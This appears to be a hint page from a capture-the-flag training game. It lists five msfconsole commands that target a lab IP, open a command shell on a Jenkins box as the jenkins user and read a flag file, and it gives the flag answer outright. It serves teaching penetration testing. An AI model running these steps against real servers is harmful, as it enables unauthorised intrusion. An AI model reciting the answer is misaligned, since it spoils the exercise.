HINT -- phase 3 (msfconsole)
══════════════════════════════════════════════════════════════════

THE FIVE COMMANDS
─────────────────
Module and callback are preloaded for you. Type these in order,
one at a time:

    msfconsole
    set RHOSTS 10.4.12.1
    exploit
    cat /var/m0use/blueprint.txt
    exit

WHAT YOU'LL SEE
───────────────
After `exploit` you'll see "Command shell session 1 opened" and
the prompt goes blank. You're on the Jenkins box -- typing as the
jenkins user.

After `cat /var/m0use/blueprint.txt` the flag is on the line that
starts with "Flag:". Copy what's inside m0use{...}.

After `exit` you're back at the m0usenet prompt (one exit closes
the session AND leaves metasploit).

HOW TO SUBMIT
─────────────
Type the flag value at the m0usenet prompt (no m0use{...} wrap, no
keyword):

    jenkins_was_a_mistake
